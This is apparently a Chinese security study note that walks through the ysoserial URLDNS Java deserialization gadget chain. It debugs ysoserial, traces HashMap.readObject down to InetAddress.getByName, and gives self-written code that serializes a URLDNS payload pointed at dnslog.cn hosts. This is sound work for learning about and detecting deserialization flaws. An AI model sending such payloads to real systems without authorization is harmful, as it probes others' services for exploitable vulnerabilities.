# 反序列化基础篇-URLDNS

## 0x00 前置知识
### 如何调试ysoserial

通过`pom.xml`加载完依赖以后，我们需要找找整个项目里有哪些入口点（其实就是主类和main函数）。这个可以在`pom.xml`里找到，比如ysoserial的主类在这里配置的：

![image](https://user-images.githubusercontent.com/84888757/204583888-59683ddf-a1b8-4dfa-baca-f9d53cde2c47.png)

`maven-assembly-plugin`就是一个用来打包项目的插件，可以把依赖、类文件什么的都打包在一起。这里的`mainClass`的值是`ysoserial.GeneratePayload`，自然就是主类。

根据这个配置，`command+左键`，打开文件`src/main/java/ysoserial/GeneratePayload.java`，点击`main`函数左边的小箭头，里面有个`debug`，这就是调试了。

![image](https://user-images.githubusercontent.com/84888757/204584282-8f69120d-d4e4-4e85-8117-1df789031ad6.png)

点击之后发现会打印`usage`，因为我们需要添加运行参数。所以，我们打开`Debug Configurations`添加运行参数：

![image](https://user-images.githubusercontent.com/84888757/204584706-554c1a2c-33b8-461c-8d6b-fe5ff9b1ace4.png)

我在`URLDNS`这个`gadget`的代码里打个断点，点击`GeneratePayload`的`main`调试，这里已经成功断下，`url`的值是 `http://111.j2zxda.dnslog.cn`。

![image](https://user-images.githubusercontent.com/84888757/204584859-560362c1-e2de-4e4f-ae60-241a9e0b5b6e.png)

这里只是做个演示，接下来我直接`F9`跑完程序，得到序列化数据：

![image](https://user-images.githubusercontent.com/84888757/204584961-a1724ba9-815f-477c-b6cc-9345ab50642b.png)


如果单独调试`payload`的话，可以直接调试执行`payloads`里面的`.java`文件，每个都带调用`PayloadRunner`的`main`函数，不设置运行参数会取`calc.exe`作为默认参数取执行。 `PayloadRunner`会先生成序列化数据再进行反序列化。

![image](https://user-images.githubusercontent.com/84888757/204566078-81456c66-4864-4665-95aa-33a7be10ea91.png)

![image](https://user-images.githubusercontent.com/84888757/204566127-aaa9d737-a4a3-44f7-8730-7284dff212f4.png)

![image](https://user-images.githubusercontent.com/84888757/204566958-df1bea0d-e132-409d-83fb-827ed7528814.png)



### writeObject和readObject
- Java在序列化一个对象时，将会调用这个对象中的 `writeObject` 方法，参数类型是 `ObjectOutputStream` ，开发者可以将任何内容写入这个 `stream` 中；
- 反序列化时，会调用 `readObject` ，开发者也可以从中读取出前面写入的内容，并进行处理。

### URLDNS介绍
URLDNS 就是ysoserial中⼀个利⽤链的名字，但它的参数只能是一个URL，其能触发的结果只是一次DNS请求，并不是命令执行。
虽然URLDNS不能进行命令执行，但是它有如下的优点，适合我们用来进行反序列化漏洞的检测：
- 使⽤Java内置的类构造，对第三⽅库没有依赖。
- 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞。

打开 `src/main/java/ysoserial/payloads/URLDNS.java` 看看ysoserial是如何构造反序列化链的。
### URLDNS源码及利用链
ysoserial已经写明了调用链，显然，这个调用链就是反序列化的过程：
```
/*
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 */
```

`URLDNS.java`如下：
```
public class URLDNS implements ObjectPayload<Object> {

    public Object getObject(final String url) throws Exception {

        //Avoid DNS resolution during payload creation
        //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
        URLStreamHandler handler = new SilentURLStreamHandler();

        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        //在上面的put过程中，计算并缓存URL的hashCode。现在重置它，以便在反序列化过程中调用hashCode时能触发DNS查找。
        Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

        return ht;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(URLDNS.class, args);
    }

    /**
* <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
* DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
* using the serialized object.</p>
*
* <b>Potential false negative:</b>
* <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
* second resolution.</p>

* 防止创建payload的时候发送DNS解析请求
*/
    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
}
```


## 0x01 序列化过程
1、首先创建了 `SilentURLStreamHandler` 对象 `handler` ，且 `SilentURLStreamHandler` 继承自 `URLStreamHandler` 类，然后重写了 `openConnection` 和 `getHostAddress` 两个方法。
```
URLStreamHandler handler = new SilentURLStreamHandler();
```

2、接着创建一个 hashmap ，用于之后进行存储。
```
HashMap ht = new HashMap();
```

3、创建一个 URL 对象，此处需要跟进 URL 类查看类初始化会发生啥。传递三个参数 (null,url,handler)
```
URL u = new URL(null, url, handler);
```

看到使用了 `hander.parseURL` 方法，下面跟进去看一下。


![image](https://user-images.githubusercontent.com/84888757/204568637-8b03a338-eaa8-4831-85e7-fc616330a968.png)


4、在初始化URL对象时，会调用 `handler` 的 `parseURL` 方法对传入的url进行解析，最后获取到 `host` ，`protocol` 等信息。

![image](https://user-images.githubusercontent.com/84888757/204568971-d1668712-ce04-4866-825f-0cdb6f916efc.png)


`handler.parseURL`方法中调用了`setURL`方法，后面跟进看一下：


![image](https://user-images.githubusercontent.com/84888757/204569053-c286d3ba-f7d7-4d08-9fb2-c3fa42c831bf.png)


`java.net.URLStreamHandler#setURL`，调用了`URL`的 `set` 方法设置`URL`对象的属性。


![image](https://user-images.githubusercontent.com/84888757/204569185-e4045c84-135d-41b2-a92c-95255b9e68f4.png)


5、之后数据存储，这一步将创建的 `URL` 对象 `u` 作为键， `url` 作为值存入 hashmap 当中，这个`url`就是用户要传入的`url`地址。
```
ht.put(u, url);
```

6、利用反射将 `URL` 对象的 `hashcode` 值设置为`-1`，此处为什么要重新赋值为`-1`，最后会说。

```
Reflections.setFieldValue(u, "hashCode", -1);
```

7、返回这个 `hashmap` 对象，在最后调用`PayloadRunner.run(URLDNS.class, args);`的时候，对这个 `hashmap` 对象进行序列化。
```
return ht;
```


## 0x02 反序列化过程
### 入口：java.util.HashMap#readObject
看到源码`URLDNS.java`中 `URLDNS` 类的 `getObject` ⽅法，ysoserial会调⽤这个⽅法获得Payload。这个⽅法返回的是⼀个对象，这个对象就是最后将被序列化的对象，在这⾥是 `HashMap` 。

因为触发反序列化的⽅法是 `readObject` ，我们可以直接看 `HashMap` 类的 `readObject` ⽅法，

`command+单击` 进入`HashMap.java`，然后查找`readObject`，如下：

`java.util.HashMap#readObject`

```
/**
* Reconstitutes this map from a stream (that is, deserializes it).
* @param s the stream
* @throws ClassNotFoundException if the class of a serialized object
*         could not be found
* @throws IOException if an I/O error occurs
*/
private void readObject(java.io.ObjectInputStream s)
    throws IOException, ClassNotFoundException {
    // Read in the threshold (ignored), loadfactor, and any hidden stuff
    s.defaultReadObject();
    reinitialize();
    if (loadFactor <= 0 || Float.isNaN(loadFactor))
        throw new InvalidObjectException("Illegal load factor: " +
                                         loadFactor);
    s.readInt();                // Read and ignore number of buckets
    int mappings = s.readInt(); // Read number of mappings (size)
    if (mappings < 0)
        throw new InvalidObjectException("Illegal mappings count: " +
                                         mappings);
    else if (mappings > 0) { // (if zero, use defaults)
        // Size the table using given load factor only if within
        // range of 0.25...4.0
        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);
        float fc = (float)mappings / lf + 1.0f;
        int cap = ((fc < DEFAULT_INITIAL_CAPACITY) ?
                   DEFAULT_INITIAL_CAPACITY :
                   (fc >= MAXIMUM_CAPACITY) ?
                   MAXIMUM_CAPACITY :
                   tableSizeFor((int)fc));
        float ft = (float)cap * lf;
        threshold = ((cap < MAXIMUM_CAPACITY && ft < MAXIMUM_CAPACITY) ?
                     (int)ft : Integer.MAX_VALUE);

        // Check Map.Entry[].class since it's the nearest public type to
        // what we're actually creating.
        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);
        @SuppressWarnings({"rawtypes","unchecked"})
            Node<K,V>[] tab = (Node<K,V>[])new Node[cap];
        table = tab;

        // Read the keys and values, and put the mappings in the HashMap
        for (int i = 0; i < mappings; i++) {
            @SuppressWarnings("unchecked")
                K key = (K) s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V) s.readObject();
            putVal(hash(key), key, value, false, false);
        }
    }
}
```

1、在第1410和1412行会将 `hashmap` 中的键和值都取出来反序列化，还原成原始状态。此处的 `key` 根据之前序列化的过程分析，是一个 `URL` 对象， `value` 是我们传入的 `url` 。

![image](https://user-images.githubusercontent.com/84888757/204573217-a83fbf9a-2456-4c6d-8e9f-df3bbc58d142.png)


2、在1413⾏的位置，可以看到将 HashMap 的键名计算了hash：
```
putVal(hash(key), key, value, false, false);
```

在此处下断点，对这个 `hash` 函数进⾏调试并跟进，如下是调⽤栈：
> 在ysoserial的注释中这样写道：“During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.”，所以，是`hashCode`的计算操作触发了DNS请求，这也是我们会精准关注`hash`函数的原因。

![image](https://user-images.githubusercontent.com/84888757/204574124-2f1498b9-d0ad-4324-8029-c87900bbe914.png)


### java.util.HashMap#hash
hash函数里有个三元判断，当传入的参数(这里的`key`就是`HashMap`对象的键)不为空的时候，就会调用 `key` 的 `hashCode()` 方法，而这个 `key` 根据上一步的分析，是创建的 `URL` 类的一个`java.net.URL`对象，所以此处调用的就是 `URL` 类中的 `hashCode` 方法：

![image](https://user-images.githubusercontent.com/84888757/204574328-e854207c-4636-409b-b752-5b5c115c4217.png)


### java.net.URL#hashCode
URLDNS 中使⽤的这个`key`是⼀个 `java.net.URL` 对象，我们看看其 `hashCode` ⽅法。
可以看到这里进行了一个`if`判断，当`hashCode`属性不为`-1`时直接返回`hashCode`属性。
如果`hashCode`为`-1`，调用`handler.hashCode`方法。

之前我们序列化时通过反射将 `hashCode` 已经设置为 `-1` 了，所以进入第885行。

![image](https://user-images.githubusercontent.com/84888757/204574980-aac82832-ae44-4f09-a346-5375db8d8330.png)

此时， `handler` 是一个 `URLStreamHandler` 对象（的某个⼦类对象），后面继续跟进其 `handler.hashCode` ⽅法就知道了，这个`handler.hashCode`是`java.net.URLStreamHandler#hashCode`方法，这里给该方法传了参数`this`进去，这个`this`其实就是`HashMap`的键`key`。

`this="http://1111.yb34ax. dnslog.cn"`

![image](https://user-images.githubusercontent.com/84888757/204575157-c01bcb43-d5b7-4fda-90eb-59b6e8884ea8.png)


### java.net.URLStreamHandler#hashCode
上面给`handler.hashCode`(也就是`java.net.URLStreamHandler#hashCode`)方法传了参数`this`进去，这个`this`其实就是`HashMap`的键，`handler`就是一个`UrLStreamHandler`类对象。

发现`getProtocol`方法能获取协议。

通过API文档可知，`InetAddress`表示`Internet`协议（IP）地址。那么合理猜测`getHostAddress`方法可以获取域名对应的ip地址。

![image](https://user-images.githubusercontent.com/84888757/204575419-5937fa40-990b-4d0a-ad05-fb9b444aec2c.png)


### java.net.URLStreamHandler#getHostAddress
在`getHostAddress`方法中看到了`InetAddress.getByName(host)`方法：

![image](https://user-images.githubusercontent.com/84888757/204575646-f92f4d8d-bb00-4fe1-9b01-2255fbccde0d.png)


### java.net.InetAddress#getByName
根据API文档，`InetAddress.getByName(host)`的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。到这⾥就没必要再继续往下跟了。

![image](https://user-images.githubusercontent.com/84888757/204575806-ee9a4b45-b3fc-4263-95d9-e9e61d184c8d.png)


看看至此的一整个调用链：

![image](https://user-images.githubusercontent.com/84888757/204575863-6cbcbe69-f70a-4cfc-9822-4cae448e2c63.png)

### 验证
我们⽤DNSLOG平台就可以查看到这次请求，在正常的利用过程中，如果出现请求记录，就证明的确存在反序列化漏洞：

![image](https://user-images.githubusercontent.com/84888757/204576216-5e00ce64-0e0b-4bc0-b0fb-21e0238c9a91.png)


## 问题及小结
⾄此，整个 `URLDNS` 的 `Gadget` 是比较简单的：
1. HashMap#readObject()
2. HashMap#hash()
3. URL#hashCode()
4. URLStreamHandler#hashCode()
5. URLStreamHandler#getHostAddress()
6. InetAddress#getByName()

简述一下构造这个`Gadget`的过程，其实就相当于构造一个`payload`的序列化过程，使得生成的`payload`在利用时可以被成功反序列化。
初始化⼀个 `java.net.URL` 对象，作为 `key` 放在 `java.util.HashMap` 中；然后，设置这个 `URL` 对象的 `hashCode` 为初始值 `-1` ，这样反序列化时将会重新计算其 `hashCode` ，才能触发到后⾯的DNS请求，否则不会调⽤ `URL->hashCode()` 。

另外，`ysoserial`为了防⽌在⽣成`Payload`的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 `SilentURLStreamHandler` 类，这不是必须的。


最后，还有几个问题要解决。

1、为什么生成序列化流的时候要通过反射将 `hashCode` 的值设为`-1`？

因为 `hashmap` 在进行数据存储的过程中（使用`put`方法时）也调用到了 `putVal` 函数，这其中会进行 `hashcode` 的计算，经过计算之后原本初始化的 `-1` 会变成计算后的值，所以要通过反射再次修改值。


在序列化流的生成位置，也可以通过反射来查看`hashCode`中间的变化。

![image](https://user-images.githubusercontent.com/84888757/204577929-cfcc4631-d55c-475f-b5a9-743ed324b3fa.png)



2、ysoserial为什么要重写`openConnection` 和 `getHostAddress` 这两个方法？

还是和hashmap存数据的时候会计算一次`hashcode`有关，在 `hashmap` 存数据的时候会计算URL对象的`hashcode`值，也就是会调用`URL.hashCode()`方法，这样的话，按照之前的分析就会发起一次DNS请求，所以为了屏蔽这个请求我们将用于发起请求的两个关键方法重写，跳过请求部分。
`ysoserial.payloads.URLDNS.SilentURLStreamHandler`

![image](https://user-images.githubusercontent.com/84888757/204579048-5b65be4d-64de-4ebd-9f04-286b4b785c82.png)



3、在CC6的链中也有和URLDNS相同的部分，就是通过计算 `hashcode` 触发构造链。


## 自己编写URLDNS相关代码
### 序列化代码
`UrlDnsSer.java`

```
package org.vulhub;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

public class UrlDnsSer {

    public static void main(String[] args) throws Exception {
        //初始化一个HashMap的时候，hashCode默认为-1
        HashMap map = new HashMap();
        //初始化⼀个 java.net.URL 对象
        URL url = new URL("http://666.mdrzq8.dnslog.cn");
        //获取URL类的hashCode属性
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        // 修改访问权限，必须使用setAccessible方法设置为True才能修改private属性
        f.setAccessible(true);
        // 设置hashCode值为123，这里可以是任何不为-1的数字。先这样设置是因为HashMap的put方法也会调用hash(key)方法，
        // 如果不这样的话，会在序列化的时候调用put方法然后调用hash(key)，然后直接进行了dnslog。
        f.set(url,123);
        System.out.println(url.hashCode());
        
        //往HashMap中添加Key为URL对象,hashCode会变成一个对URL对象进行计算过的值
        //导致直接进行了DNS请求
        //如果序列化之前不重新设置hashCode值为-1，则反序列化无法成功触发
        map.put(url,"123");
        
        // 通过反射，改变已有对象的属性
        // 将url的hashCode重新设置为-1。确保在反序列化时能够成功触发
        f.set(url,-1);

        try{
            // 序列化对象
            FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
            ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);
            outputStream.writeObject(map);
            outputStream.close();
            fileOutputStream.close();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
```

### 反序列化代码
`UrlDnsDeSer.java`

```
package org.vulhub;


import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UrlDnsDeSer {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        // 反序列化对象
        FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
        ObjectInputStream ois = new ObjectInputStream(fileInputStream);

        ois.readObject();
    }
}
```

执行完反序列化代码以后：

![image](https://user-images.githubusercontent.com/84888757/204579711-abc51af5-45c0-4a72-a93f-57e6e29902b8.png)


## 参考链接
- [Ghost2097221/security_study_notes/S02-URLDNS反序列化构造链.pdf](https://github.com/Ghost2097221/security_study_notes/blob/master/S02-URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9E%84%E9%80%A0%E9%93%BE.pdf)
- [Java安全漫谈 - 08.认识最简单的Gadget——URLDNS @phith0n](https://t.zsxq.com/ieMZBQj)


